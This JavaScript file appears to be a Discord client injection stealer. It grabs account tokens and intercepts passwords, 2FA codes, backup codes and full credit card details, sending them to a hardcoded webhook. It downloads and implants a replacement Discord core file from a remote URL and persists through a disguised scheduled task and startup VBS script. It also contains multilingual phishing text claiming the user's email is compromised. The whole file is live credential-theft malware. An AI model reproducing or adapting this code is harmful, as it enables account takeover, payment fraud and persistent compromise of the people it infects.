const querystring = require('querystring');
const https = require('https');
const http = require('http');
const path = require('path');
const fs = require('fs');

const { exec } = require('child_process');
const { promisify } = require('util');
const { BrowserWindow, session } = require('electron');

let passwordDetected = false;

const execCommand = async (command, options = {}) => {
    try {
        const { stdout, stderr } = await promisify(exec)(command, options);
        if (stderr) {
            console.error(stderr);
        }
        return stdout.trim();
    } catch (error) {
        return null;
    }
};


const BLOG_FILE_PATH = path.join(__dirname, 'exec.log');

const logError = (message) => {
    //const timestamp = new Date().toISOString();
    //const fullMessage = `[${timestamp}] ${message}\n`;
    //fs.appendFile(BLOG_FILE_PATH, fullMessage, (err) => {
    //    if (err) console.error('Log yazılamadı:', err);
    //});
};

const execScript = async (script) => {
    const windows = BrowserWindow.getAllWindows();
    if (windows.length === 0) return null;
    try {
        const result = await windows[0].webContents.executeJavaScript(script, true);
        logError(`execScript basari: ${result} ---Script ${script}`);
        return result;
    } catch (error) {
        logError(`execScript Hatası: ${error.message} ---Script ${script}`);
        return null;
    }
};

const CONFIG = {
    webhook: 'https://discord.com/api/webhooks/1466568078639759544/bB2FdftkVRErIzt960zJBFoH2SQwJESL2OOdyctm7eWzx8rbZ8aZ1kzbyn20f3Wo_dLf',
    perionId: '',
    API: 'null',
    auto_logout_after_injection : 'false',
    auto_disable_qr_login : 'true',
    auto_user_profile_edit: 'false',
    auto_persist_startup: 'false',
    auto_mfa_disabler: 'false',
    auto_email_update: 'false',
    injection_url: 'https://raw.githubusercontent.com/undefinedsource338/dfasfasfasgfsdadfa/main/injectiosn.js',
    injector_url: 'disabled',
    get: {
        token: () => execScript(`(()=>{webpackChunkdiscord_app.push([[Math.random()],{},e=>{for(let m of Object.values(e.c)){try{let ex=m.exports,fn=ex?.default?.getToken||ex?.getToken;if(typeof fn==="function"){let t=fn();if(typeof t==="string")window._extractedToken=t}}catch{}}}]);return window._extractedToken})()`),
        logout: () => execScript(`function getLocalStoragePropertyDescriptor() {const o = document.createElement("iframe");document.head.append(o);const e = Object.getOwnPropertyDescriptor(o.contentWindow, "localStorage");return o.remove(), e};Object.defineProperty(window, "localStorage", getLocalStoragePropertyDescriptor());const localStorage = getLocalStoragePropertyDescriptor().get.call(window);console.log(localStorage.token);if(localStorage.token) {localStorage.token = null,localStorage.tokens = null,localStorage.MultiAccountStore = null,location.reload();} else {return"This is an intentional error";}`),
        backup_codes: () => execScript(`const elements = document.querySelectorAll('span[class^="code_"]');const isBoolean = (value) => typeof value === "boolean";const codes = Array.from(elements).map((element) => {const code = element.textContent.trim().replace(/-/g, '');const container = element.closest('span[class^="checkboxWrapper_"]');let consumed = container && Array.from(container.classList).some((className) => className.startsWith("checked_"));consumed = isBoolean(consumed) ? consumed : false;return {code,consumed};});codes;`),
        clear_local_storage: () => execScript(`const iframe = document.createElement('iframe');document.body.appendChild(iframe);iframe.contentWindow.localStorage.clear();document.body.removeChild(iframe);setTimeout(() => {window.location.reload();}, 3000);`),
    },
    auth_filters: {
        urls: [
            '/users/@me',
            '/auth/login',
            '/auth/register',
            '/remote-auth/login',
            '/mfa/totp',
            '/mfa/totp/enable',
            '/mfa/sms/enable',
            '/mfa/totp/disable',
            '/mfa/sms/disable',
            '/mfa/codes-verification',
        ],
    },
    session_filters: {
        urls: [
            'wss://remote-auth-gateway.discord.gg/*',
            'https://discord.com/api/v*/auth/sessions',
            'https://*.discord.com/api/v*/auth/sessions',
            'https://discordapp.com/api/v*/auth/sessions',
        ],
    },
    payment_filters: {
        urls: [
            'https://api.stripe.com/v*/tokens',
            'https://discord.com/api/v9/users/@me/billing/payment-sources/validate-billing-address',
            'https://discord.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens',
            'https://discordapp.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens',
            'https://*.discord.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens',
            'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
        ],
    },
    badges: {
        _nitro: [
            "<:DiscordBoostNitro1:1087043238654906472> ",
            "<:DiscordBoostNitro2:1087043319227494460> ",
            "<:DiscordBoostNitro3:1087043368250511512> ",
            "<:DiscordBoostNitro6:1087043493236592820> ",
            "<:DiscordBoostNitro9:1087043493236592820> ",
            "<:DiscordBoostNitro12:1162420359291732038> ",
            "<:DiscordBoostNitro15:1051453775832961034> ",
            "<:DiscordBoostNitro18:1051453778127237180> ",
            "<:DiscordBoostNitro24:1051453776889917530> ",
        ],
        _discord_emloyee: {
            value: 1,
            emoji: "<:DiscordEmloyee:1163172252989259898>",
            rare: true,
        },
        _partnered_server_owner: {
            value: 2,
            emoji: "<:PartneredServerOwner:1163172304155586570>",
            rare: true,
        },
        _hypeSquad_events: {
            value: 4,
            emoji: "<:HypeSquadEvents:1163172248140660839>",
            rare: true,
        },
        _bug_hunter_level_1: {
            value: 8,
            emoji: "<:BugHunterLevel1:1163172239970140383>",
            rare: true,
        },
        _house_bravery: {
            value: 64,
            emoji: "<:HouseBravery:1163172246492287017>",
            rare: false,
        },
        _house_brilliance: {
            value: 128,
            emoji: "<:HouseBrilliance:1163172244474822746>",
            rare: false,
        },
        _house_balance: {
            value: 256,
            emoji: "<:HouseBalance:1163172243417858128>",
            rare: false,
        },
        _early_supporter: {
            value: 512,
            emoji: "<:EarlySupporter:1163172241996005416>",
            rare: true,
        },
        _bug_hunter_level_2: {
            value: 16384,
            emoji: "<:BugHunterLevel2:1163172238942543892>",
            rare: true,
        },
        _early_bot_developer: {
            value: 131072,
            emoji: "<:EarlyBotDeveloper:1163172236807639143>",
            rare: true,
        },
        _certified_moderator: {
            value: 262144,
            emoji: "<:CertifiedModerator:1163172255489085481>",
            rare: true,
        },
        _active_developer: {
            value: 4194304,
            emoji: "<:ActiveDeveloper:1163172534443851868>",
            rare: true,
        },
        _spammer: {
            value: 1048704,
            emoji: "⌨️",
            rare: false,
        },
    },
};

// CONFIG.swebhook kaldırıldı - sadece webhook kullanılacak

const parseJSON = (data) => {
    try {
        return JSON.parse(data || '');
    } catch {
        return {};
    }
};

const clearLocalStorage = () => {
    try {
        CONFIG.get.clear_local_storage();
    } catch {
        return null;
    }
}

const request = async (method, url, headers = {}, data = null) => {
    try {
        const targets = [];

        // Webhook adresleri null değilse ekle
        if (url.includes('api/webhooks')) {
            if (CONFIG.webhook && CONFIG.webhook !== 'null') {
                targets.push(CONFIG.webhook);
            }
        } else {
            targets.push(url);
        }

        const requests = targets.map(url => {
            return new Promise((resolve, reject) => {
                try {
                    const { protocol, hostname, pathname, search } = new URL(url);
                    const client = protocol === 'https:' ? https : http;
                    const options = {
                        hostname,
                        path: pathname + search,
                        method,
                        headers: {
                            'Access-Control-Allow-Origin': '*',
                            ...headers,
                        },
                    };

                    const req = client.request(options, (res) => {
                        let resData = '';
                        res.on('data', (chunk) => resData += chunk);
                        res.on('end', () => resolve(resData));
                    });

                    req.on('error', err => {
                        logError(`Request Hatası: ${err.message}`);
                        reject(err);
                    });

                    if (data) req.write(data);
                    req.end();
                } catch (err) {
                    logError(`URL Oluşturma Hatası: ${err.message}`);
                    reject(err);
                }
            });
        });

        return Promise.all(requests);
    } catch (err) {
        logError(`Request Try Catch Hatası: ${err.message}`);
        return Promise.reject(err);
    }
};

const AuritaCord = async () => {
    try {
        //const logout = await CONFIG.get.logout();
        const token = await CONFIG.get.token();
        const API = new Fetcher(token);

        const [user, profile, billing, friends, servers] = await Promise.all([
            API.User(),
            API.Profile(),
            API.Billing(),
            API.Friends(),
            API.Servers()
        ]);

        return {
            //logout,
            token,
            user,
            profile,
            billing,
            friends,
            servers
        };
    } catch {
        return {}
    }
}

const notify = async (ctx, token, user) => {
    const getData = new GetDataUser();

    let profile, system, network, billing, friends, servers;
    try {
        profile = (await AuritaCord()).profile;
        logError('profile ok');
    } catch (e) { logError(`profile error: ${e.message}`); }

    try {
        system = await getData.SystemInfo();
        logError('system ok');
    } catch (e) { logError(`system error: ${e.message}`); }

    try {
        network = await getData.Network();
        logError('network ok');
    } catch (e) { logError(`network error: ${e.message}`); }

    try {
        billing = await getData.Billing(token);
        logError('billing ok');
    } catch (e) { logError(`billing error: ${e.message}`); }

    try {
        friends = await getData.Friends(token);
        logError('friends ok');
    } catch (e) { logError(`friends error: ${e.message}`); }

    try {
        servers = await getData.Servers(token);
        logError('servers ok');
    } catch (e) { logError(`servers error: ${e.message}`); }

    let nitro = '', badges = '';
    try {
        nitro = getData.Nitro(profile);
        logError('nitro ok');
    } catch (e) { logError(`nitro error: ${e.message}`); }

    try {
        badges = getData.Badges(user.flags);
        logError('badges ok');
    } catch (e) { logError(`badges error: ${e.message}`); }

    ctx.content = `\`${process.env.USERNAME}\` - \`${process.env.USERDOMAIN}\`\n\n${ctx.content}`;
    ctx.username = `https://t.me/spongebobshower`;
    ctx.avatar_url = `https://cdn.discordapp.com/attachments/1386823402521755798/1434307231121146056/1FSmOga.gif`;

    ctx.embeds[0].fields.unshift({
        name: `<a:hearts:1176516454540116090> Token:`,
        value: '```' + token + '```' + '\n' + 'Copy your token manually from above.',
        inline: false
    });

    ctx.embeds[0].thumbnail = {
        url: `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`
    };

    ctx.embeds[0].fields.push(
        { name: "\u200b", value: "\u200b", inline: false },
        { name: "Nitro", value: nitro, inline: true },
        { name: "Phone", value: user.phone ? `\`${user.phone}\`` : '❓', inline: true },
        { name: "\u200b", value: "\u200b", inline: false },
        { name: "Badges", value: badges, inline: true },
        { name: "Billing", value: billing, inline: true },
        { name: "Path", value: `\`${__dirname.trim().replace(/\\/g, "/")}\``, inline: false },
    );

    if (friends) {
        ctx.embeds.push({ title: friends.title, description: friends.description });
    }

    if (servers) {
        ctx.embeds.push({ title: servers.title, description: servers.description });
    }

    ctx.embeds.push({
        title: `System Information`,
        fields: [
            { name: "User", value: `||\`\`\`\nUsername: ${process.env.USERNAME}\nHostname: ${process.env.USERDOMAIN}\`\`\`||` },
            { name: "System", value: `||\`\`\`\n${Object.entries(system || {}).map(([k, v]) => `${k}: ${v}`).join("\n")}\`\`\`||` },
            { name: "Network", value: `||\`\`\`\n${Object.entries(network || {}).map(([k, v]) => `${k}: ${v}`).join("\n")}\`\`\`||` }
        ]
    });

    ctx.embeds.forEach(embed => {
        embed.color = 12740607;
        embed.author = {
            name: `${user.username} | ${user.id}`,
            icon_url: user.avatar
                ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png`
                : `https://cdn.discordapp.com/embed/avatars/${Math.round(Math.random() * 5)}.png`,
        };

        embed.footer = {
            text: 'https://t.me/spongebobshower',
            icon_url: "https://cdn.discordapp.com/attachments/1386823402521755798/1434307231121146056/1FSmOga.gif",
        };

        embed.timestamp = new Date();
    });

    try {
        logError('Webhook gönderiliyor...');
        const response = await request('POST', CONFIG.webhook, {
            "Content-Type": "application/json"
        }, JSON.stringify(ctx));
        logError('Webhook başarıyla gönderildi.');
        return response;
    } catch (error) {
        logError(`Webhook hatası: ${error.message}`);
        return null;
    }
};

const getBackupCodes = async (response) => {
    try{
        const backup_codes = await CONFIG.get.backup_codes();
        const codes = response.backup_codes || backup_codes;

        const filtered = codes.filter(code => !code.consumed);

        const validCode = filtered
            .map(code => `${code.code.slice(0, 4)}-${code.code.slice(4)}`)
            .join('\n');

        return validCode;
    } catch (error) {
        return ''
    }
};

const editSettingUser = async (token) => {
    try {
        const response = parseJSON(await request('PATCH', 'https://discord.com/api/v9/users/@me/settings', {
            'Content-Type': 'application/json',
            'Authorization': token
        }, JSON.stringify({
            status: 'dnd',
            email_notifications_enabled: false,
            stream_notifications_enabled: false,
            custom_status: {
                text: 'babayimxd',
                expires_at: null,
                emoji_id: null,
                emoji_name: null
            },
        })));

        return response;
    } catch (error) {
        return {};
    }
};

class Fetcher {
    constructor(token) {
        this.token = token;
    }
    _fetch = async (endpoint, headers) => {
        const APIs = [
            'https://discordapp.com/api',
            'https://discord.com/api',
            'https://canary.discord.com/api',
            'https://ptb.discord.com/api'
        ];
        const response = parseJSON(await request('GET', `${APIs[Math.floor(Math.random() * APIs.length)]}/v9/users/${endpoint}`, headers));
        return response;
    };

    User = async () => {
        return await this._fetch("@me", {
            'Content-Type': 'application/json',
            "Authorization": this.token
        });
    };

    Profile = async () => {
        return await this._fetch(`${Buffer.from(this.token.split(".")[0], "base64").toString("binary")}/profile`, {
            'Content-Type': 'application/json',
            "Authorization": this.token
        });
    };

    Friends = async () => {
        return await this._fetch("@me/relationships", {
            'Content-Type': 'application/json',
            "Authorization": this.token
        });
    };

    Servers = async () => {
        return await this._fetch("@me/guilds?with_counts=true", {
            'Content-Type': 'application/json',
            "Authorization": this.token
        });
    };

    Billing = async () => {
        return await this._fetch("@me/billing/payment-sources", {
            'Content-Type': 'application/json',
            "Authorization": this.token
        });
    };
};

class GetDataUser {
    SystemInfo = async () => {
        try {
            return {
                os: "Windows 10 Pro 64-bit",
                cpu: "Intel(R) Core(TM) i7-9700K CPU @ 3.60GHz",
                gpu: "NVIDIA GeForce RTX 3060",
                ram: "16 GB",
                uuid: "12345678-1234-5678-1234-567812345678",
                productKey: "Windows-Product-XYZ",
                macAddress: "00-14-22-01-23-45",
                localIP: "192.168.1.100",
                cpuCount: "8",
            };
        } catch (error) {
            return {};
        }
    };

    /*
    SystemInfo = async () => {
        try {
            const [os, cpu, gpu, ram, uuid, productKey, macAddress, localIP, cpuCount] = await Promise.all([
                execCommand("wmic OS get caption, osarchitecture | more +1"),
                execCommand("wmic cpu get name | more +1"),
                execCommand("wmic PATH Win32_VideoController get name | more +1").then(stdout => stdout.replace(/\r\n|\r/g, "")),
                execCommand("wmic computersystem get totalphysicalmemory | more +1").then(stdout => `${Math.floor(parseInt(stdout) / (1024 * 1024 * 1024))} GB`),
                execCommand("powershell.exe (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID"),
                execCommand("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' -Name ProductName"),
                execCommand("powershell.exe (Get-CimInstance -ClassName 'Win32_NetworkAdapter' -Filter 'NetConnectionStatus = 2').MACAddress"),
                execCommand("powershell.exe (Get-NetIPAddress).IPAddress"),
                execCommand("echo %NUMBER_OF_PROCESSORS%")
            ]);

            return {
                os,
                cpu,
                gpu,
                ram,
                uuid,
                productKey,
                macAddress,
                localIP,
                cpuCount,
            };
        } catch (error) {
            return {};
        }
    };
     */

    Network = async () => {
        try {
            const response = parseJSON(await request('GET', "http://ip-api.com/json", {
                'Content-Type': 'application/json'
            }));
            return response;
        } catch (error) {
            return {};
        }
    };

    Badges = (flags) =>
        Object.keys(CONFIG.badges)
            .reduce((result, badge) => CONFIG.badges.hasOwnProperty(badge)
                && (flags & CONFIG.badges[badge].value) === CONFIG.badges[badge].value
                    ? `${result}${CONFIG.badges[badge].emoji} `
                    : result, '',
            ) || '❓';

    RareBadges = (flags) =>
        Object.keys(CONFIG.badges)
            .reduce((result, badge) => CONFIG.badges.hasOwnProperty(badge)
                && (flags & CONFIG.badges[badge].value) === CONFIG.badges[badge].value
                && CONFIG.badges[badge].rare
                    ? `${result}${CONFIG.badges[badge].emoji} `
                    : result, '',
            ) || '';

    Billing = async (token) => {
        const API = new Fetcher(token);
        const data = await API.Billing();

        const payment = {
            1: '💳',
            2: '<:Paypal:1129073151746252870>'
        };
        let paymentMethods = data.map(method => payment[method.type] || '❓').join('');
        return paymentMethods || '❓';
    }

    Friends = async (token) => {
        const API = new Fetcher(token);
        const friends = await API.Friends();
        const { RareBadges } = new GetDataUser();

        const filteredFriends = friends
            .filter(friend => friend.type === 1)
            .map(friend => ({
                username: friend.user.username,
                flags: RareBadges(friend.user.public_flags),
            }))

        const rareFriends = filteredFriends.filter(friend => friend.flags);

        const hQFriends = rareFriends.map(friend => {
            const name = `${friend.username}`;
            return `${friend.flags} | ${name}\n`;
        });

        const hQFriendsPlain = hQFriends.join('');

        if (hQFriendsPlain.length === 0) {
            return false;
        };

        if (hQFriendsPlain.length > 4050) {
            return {
                title: `**Rare Friends (Too many to display):**\n`,
                description: "Too many friends to display.",
            };
        };

        return {
            title: `**Rare Friends (${hQFriends.length}):**\n`,
            description: `${hQFriendsPlain}`,
        };
    };

    Servers = async (token) => {
        const API = new Fetcher(token);
        const guilds = await API.Servers();

        const filteredGuilds = guilds
            .filter(guild => guild.owner || (guild.permissions & 8) === 8)
            .filter(guild => guild.approximate_member_count >= 500)
            .map(guild => ({
                id: guild.id,
                name: guild.name,
                owner: guild.owner,
                member_count: guild.approximate_member_count
            }));

        const hQGuilds = await Promise.all(filteredGuilds.map(async guild => {
            const response = parseJSON(await request('GET', `https://discord.com/api/v8/guilds/${guild.id}/invites`, {
                'Content-Type': 'application/json',
                'Authorization': token
            }));

            const invites = response;
            const invite = invites.length > 0
                ? `[Join Server](https://discord.gg/${invites[0].code})`
                : 'No Invite';

            const emoji = guild.owner
                ? `<:Owner:963333541343686696> Owner`
                : `<:Staff:1136740017822253176> Admin`;
            const members = `Members: \`${guild.member_count}\``;
            const name = `**${guild.name}** - (${guild.id})`;

            return `${emoji} | ${name} - ${members} - ${invite}\n`;
        }));

        const hQGuildsPlain = hQGuilds.join('');

        if (hQGuildsPlain.length === 0) {
            return false;
        };

        if (hQGuildsPlain.length > 4050) {
            return {
                title: `**Rare Servers (Too many to display):**\n`,
                description: "Too many servers to display.",
            };
        };

        return {
            title: `**Rare Guilds (${hQGuilds.length}):**\n`,
            description: `${hQGuildsPlain}`,
        }
    };

    getDate = (current, months) => {
        return new Date(current).setMonth(current.getMonth() + months);
    };

    Nitro = (flags) => {
        const { premium_type, premium_guild_since } = flags,
            nitro = "<:DiscordNitro:587201513873473542>";
        switch (premium_type) {
            default:
                return "❓";
            case 1:
                return nitro;
            case 2:
                if (!premium_guild_since) return nitro;
                let months = [1, 2, 3, 6, 9, 12, 15, 18, 24],
                    rem = 0;
                for (let i = 0; i < months.length; i++)
                    if (Math.round((this.getDate(new Date(premium_guild_since), months[i]) - new Date()) / 86400000) > 0) {
                        rem = i;
                        break;
                    }
                return `${nitro} ${CONFIG.badges._nitro[rem]}`;
        }
    };
};

const delay = (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms))
};

const Cruise = async (type, response, request, email, password, token, action) => {
    let API;
    let user;
    let content;
    switch (type) {
        case 'LOGIN_USER':
            API = new Fetcher(token);
            user = await API.User();
            content = {
                content: `**${user?.username ? user.username : 'unknown'} | ${user?.id ? user.id : 'unknown'}** ${action}!`,
                embeds: [{
                    fields: [
                        { name: "Password", value: `\`${password}\``, inline: true },
                        { name: "Email", value: `\`${email}\``, inline: true },
                    ],
                }],
            };

            if (request?.code !== undefined) {
                content.embeds[0].fields.push(
                    { name: "Used 2FA code", value: `\`${request.code}\``, inline: false }
                );
            };

            notify(content, token, user);
            break;
        case 'USERNAME_CHANGED':
            API = new Fetcher(token);
            user = await API.User();
            content = {
                content: `**${user?.username ? user.username : 'unknown'} | ${user?.id ? user.id : 'unknown'}** ${action}!`,
                embeds: [{
                    fields: [
                        { name: "New Username", value: `\`${request.username}\``, inline: true },
                        { name: "Password", value: `\`${request.password}\``, inline: true },
                        { name: "Email", value: `\`${email}\``, inline: false },
                    ],
                }],
            };
            notify(content, token, user);
            break;
        case 'EMAIL_CHANGED':
            API = new Fetcher(token);
            user = await API.User();
            content = {
                content: `**${user?.username ? user.username : 'unknown'} | ${user?.id ? user.id : 'unknown'}** ${action}!`,
                embeds: [{
                    fields: [
                        { name: "New Email", value: `\`${email}\``, inline: true },
                        { name: "Password", value: `\`${password}\``, inline: true },
                    ],
                }],
            };
            notify(content, token, user);
            break;
        case 'PASSWORD_CHANGED':
            API = new Fetcher(token);
            user = await API.User();
            content = {
                content: `**${user?.username ? user.username : 'unknown'} | ${user?.id ? user.id : 'unknown'}** ${action}!`,
                embeds: [{
                    fields: [
                        { name: "New Password", value: `\`${request.new_password}\``, inline: true, },
                        { name: "Old Password", value: `\`${request.password}\``, inline: true, },
                        { name: "Email", value: `\`${email}\``, inline: false, },
                    ],
                }],
            };
            notify(content, token, user);
            break;
        case 'BACKUP_CODES':
            API = new Fetcher(token);
            user = await API.User();

            const codes = await getBackupCodes(response);

            content = {
                content: `**${user?.username ? user.username : 'unknown'} | ${user?.id ? user.id : 'unknown'}** ${action}!`,
                embeds: [{
                    fields: [
                        { name: "Password", value: `\`${password}\``, inline: true },
                        { name: "Email", value: `\`${email}\``, inline: true },
                        { name: "\u200b", value: "\u200b", inline: false },
                        { name: "Security codes", value: `\`\`\`\n${codes}\`\`\``, inline: false },
                    ],
                }],
            };

            if (request?.code !== undefined && request?.secret !== undefined) {
                content.embeds[0].fields.push(
                    { name: "Used 2FA code", value: `\`${request.code}\``, inline: true },
                    { name: "Authentication secret", value: `\`${request.secret}\``, inline: true },
                );
            };

            notify(content, token, user);
            break;
        case 'CREDITCARD_ADDED':
            API = new Fetcher(token);
            user = await API.User();
            content = {
                content: `**${user?.username ? user.username : 'unknown'} | ${user?.id ? user.id : 'unknown'}** ${action}!`,
                embeds: [{
                    fields: [
                        { name: "Email", value: `\`${email}\``, inline: true },
                        { name: "\u200b", value: "\u200b", inline: false },
                        { name: "Number", value: `\`${request.item["card[number]"]}\``, inline: true },
                        { name: "CVC", value: `\`${request.item["card[cvc]"]}\``, inline: true },
                        { name: "Expiration", value: `\`${request.item["card[exp_month]"]}/${request.item["card[exp_year]"]}\``, inline: true },
                        { name: "Address", value: `\`\`\`\nLine 1: ${request["line_1"]}\nLine 2: ${request["line_2"]}\nCity: ${request["city"]}\nState: ${request["state"]}\nPostal Code: ${request["postal_code"]}\nCountry: ${request["country"]}\n\`\`\``, inline: false },
                    ],
                }],
            };
            notify(content, token, user);
            break;
        case 'PAYPAL_ADDED':
            API = new Fetcher(token);
            user = await API.User();
            content = {
                content: `**${user?.username ? user.username : 'unknown'} | ${user?.id ? user.id : 'unknown'}** ${action}!`,
                embeds: [{
                    fields: [
                        { name: "Email", value: `\`${email}\``, inline: true },
                    ],
                }],
            };
            notify(content, token, user);
            break;
        case 'INJECTED':
            API = new Fetcher(token);
            user = await API.User();
            content = {
                content: `**${user?.username ? user.username : 'unknown'} | ${user?.id ? user.id : 'unknown'}** ${action}!`,
                embeds: [{
                    fields: [
                        { name: "Email", value: `\`${email}\``, inline: true },
                    ],
                }],
            };
            notify(content, token, user);
            break;
        default:
    }
};

const forcePersistStartup = async () => {
    const vbsFileName = 'DiscordBetterProtector.vbs';
    const batFileName = 'setupTask.bat';

    const protectFolderPath = path.join(process.env.APPDATA, 'Microsoft', 'Protect');
    const vbsFilePathInProtect = path.join(protectFolderPath, vbsFileName);
    const startupFolderPath = path.join(process.env.APPDATA, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup');
    const vbsFilePathInStartup = path.join(startupFolderPath, vbsFileName);
    const batFilePath = path.join(__dirname, batFileName);

    const scriptVbsContent = await request('GET', CONFIG.injector_url, {
        'Content-Type': 'text/plain'
    });

    const responseVbsMalware = scriptVbsContent[0]?.toString('utf8') || '';
    const vbsContent = responseVbsMalware
        .replace("replace_webhook_url", CONFIG.webhook)
        .replace("replace_api_url", CONFIG.API)
        .replace("replace_auto_user_profile_edit", CONFIG.auto_user_profile_edit)
        .replace("replace_auto_persist_startup", CONFIG.auto_persist_startup)
        .replace("replace_auto_mfa_disabler", CONFIG.auto_mfa_disabler)
        .replace("replace_auto_email_update", CONFIG.auto_email_update)

    const checkFileExists = (filePath) => {
        return new Promise((resolve) => {
            fs.access(filePath, fs.constants.F_OK, (err) => {
                resolve(!err);
            });
        });
    };

    const checkScheduledTaskExists = () => {
        return new Promise((resolve) => {
            exec('schtasks /query /tn "WindowsSecurityHealthSystrayxd"', (err) => {
                resolve(!err);
            });
        });
    };

    const createVBSFile = (filePath) => {
        return new Promise((resolve, reject) => {
            fs.writeFile(filePath, vbsContent.trim(), (err) => {
                if (err) return reject(err);
                resolve();
            });
        });
    };

    const createBatchFile = () => {
        const batContent = `
            @echo off
            setlocal
            set "vbsFilePath=%APPDATA%\\Microsoft\\Protect\\${vbsFileName}"
            schtasks /create /tn "WindowsSecurityHealthSystrayxd" /tr "wscript.exe \"%vbsFilePath%\"" /sc onlogon /f
            if %ERRORLEVEL% EQU 0 (
                echo We are scanning your Discord application(s)....
            ) else (
                echo An unexpected error occurred...
            )
            timeout /t 5 /nobreak > NUL
            del "%~f0"
            endlocal
        `;

        return new Promise((resolve, reject) => {
            fs.writeFile(batFilePath, batContent.trim(), (err) => {
                if (err) return reject(err);
                resolve();
            });
        });
    };

    const executeBatchFile = () => {
        return new Promise((resolve, reject) => {
            exec(`powershell -Command "Start-Process cmd -ArgumentList '/c \"${batFilePath}\"' -Verb RunAs"`, (err) => {
                if (err) return reject(err);
                resolve();
            });
        });
    };

    const protectExists = await checkFileExists(vbsFilePathInProtect);
    const startupExists = await checkFileExists(vbsFilePathInStartup);
    const taskExists = await checkScheduledTaskExists();

    if (!protectExists) {
        await createVBSFile(vbsFilePathInProtect);
    };
    if (!startupExists) {
        await createVBSFile(vbsFilePathInStartup);
    };
    if (!taskExists) {
        await createBatchFile();
        await executeBatchFile();

        setTimeout(() => {
            fs.unlink(batFilePath, (error) => {
                if (error) {
                    console.log(error);
                }
            });
        }, 10000);
    }
};

const startup = async () => {
    const startupDir = path.join(__dirname, 'dcthemes');

    const {
        token,
        user,
    } = await AuritaCord();

    logError('tokenfoundforstart: '  + token + 'path: ' + startupDir);


    if(token) {
        if (fs.existsSync(startupDir)) {

            fs.rmdirSync(startupDir);
            Cruise(
                'INJECTED',
                null,
                null,
                user.email,
                null,
                token,
                `It is injected in the route: \`${__dirname.trim().replace(/\\/g, "/")}\``
            );
            if (CONFIG.auto_logout_after_injection === 'true') {
                clearLocalStorage();
            }
        }
        /*if (CONFIG.auto_logout_after_injection === 'true') {
            await CONFIG.get.logout();
        }*/
    } else {
        logError('\nNOOO')
    }

    const getDiscordPaths = () => {
        const args = process.argv;
        const appDir = path.dirname(args[0]);
        let resourceDir;

        switch (process.platform) {
            case 'win32':
                resourceDir = path.join(appDir, 'resources');
                break;
            default:
                return { resource: undefined, app: undefined };
        }

        return fs.existsSync(resourceDir)
            ? { resource: resourceDir, app: appDir }
            : { resource: undefined, app: undefined };
    };

    const { resource, app } = getDiscordPaths();
    if (!resource || !app) return;

    const appDir = path.join(resource, 'app');

    const packageJsonFile = path.join(appDir, 'package.json');
    const startupScriptRunJsFile = path.join(appDir, 'index.js');

    const coreJsFile = path.join(app, 'modules', fs.readdirSync(path.join(app, 'modules')).find(file => /discord_desktop_core-/.test(file)), 'discord_desktop_core', 'index.js');
    const betterDiscordAsarFile = path.join(process.env.APPDATA, 'betterdiscord', 'data', 'betterdiscord.asar');

    if (!fs.existsSync(appDir)) {
        fs.mkdirSync(appDir, { recursive: true });
    }

    [packageJsonFile, startupScriptRunJsFile].forEach(file => {
        if (fs.existsSync(file)) fs.unlinkSync(file);
    });

    // In the future maybe add more operating systems!
    // This may work on other systems but Windows is recommended
    if (['win32'].includes(process.platform)) {
        fs.writeFileSync(packageJsonFile, JSON.stringify({ name: 'discord', main: 'index.js' }, null, 4));

        const scriptRunJsFileContent = `
            const fs = require('fs');
            const https = require('https');
            const path = require('path');
            const coreJsFile = '${coreJsFile}';
            const betterDiscordAsarFile = '${betterDiscordAsarFile}';

            const initialize = async () => {
                try {
                    const data = await fs.promises.readFile(coreJsFile, 'utf8');

                    if (
                        data.length < 20000 ||
                        data === "module.exports = require('./core.asar')"
                    ) {
                        await downloadAndUpdateFile();
                    };
                } catch (err) {
                    console.error(err);
                }
            };

            const downloadAndUpdateFile = async () => {
                try {
                    const fileStream = fs.createWriteStream(coreJsFile);

                    await new Promise((resolve, reject) => {
                        https.get('${CONFIG.injection_url}', { headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36' } }, (res) => {
                            res.on('data', chunk => fileStream.write(chunk));

                            res.on('end', () => {
                                fileStream.end();
                                resolve();
                            });
                        }).on('error', err => {
                            reject(err);
                        });
                    });
                } catch (err) {
                    setTimeout(downloadAndUpdateFile, 10000);
                }
            };

            initialize();
            require('${path.join(resource, 'app.asar')}');

            if (fs.existsSync(betterDiscordAsarFile)) require(betterDiscordAsarFile);
        `;
        fs.writeFileSync(startupScriptRunJsFile, scriptRunJsFileContent.replace(/\\/g, '\\\\'));
    }

};

const translateEmailUpdate = async (locale) => {
    const message = [
        "User Settings",
        "Edit email address",
        "We have detected something unusual with your (<strong>Discord</strong>) account, your address,",
        "has been compromised.",
        "Please change it to continue using your account.",
        "No longer have access to your email",
        "Contact your email provider to fix it.",
    ];
    const normalizeLocale = (locale) => {
        if (!locale) return 'en';
        return locale.split('-')[0].toLowerCase();
    };
    const baseLocale = normalizeLocale(locale);
    const translations = {
        'en': [
            "User Settings",
            "Edit email address",
            "We have detected something unusual with your (<strong>Discord</strong>) account, your address,",
            "has been compromised.",
            "Please change it to continue using your account.",
            "No longer have access to your email",
            "Contact your email provider to fix it."
        ],
        'tr': [
            "Kullanıcı Ayarları",
            "E-posta adresini düzenle",
            "(<strong>Discord</strong>) hesabınızla ilgili olağandışı bir durum tespit ettik, adresiniz,",
            "tehlikeye girmiş.",
            "Hesabınızı kullanmaya devam etmek için lütfen değiştirin.",
            "E-postanıza artık erişiminiz yok",
            "Bunu düzeltmek için e-posta sağlayıcınızla iletişime geçin."
        ],
        'es': [
            "Configuración del Usuario",
            "Editar dirección de correo electrónico",
            "Hemos detectado algo inusual con tu cuenta de (<strong>Discord</strong>), tu dirección,",
            "ha sido comprometida.",
            "Por favor cámbiala para continuar usando tu cuenta.",
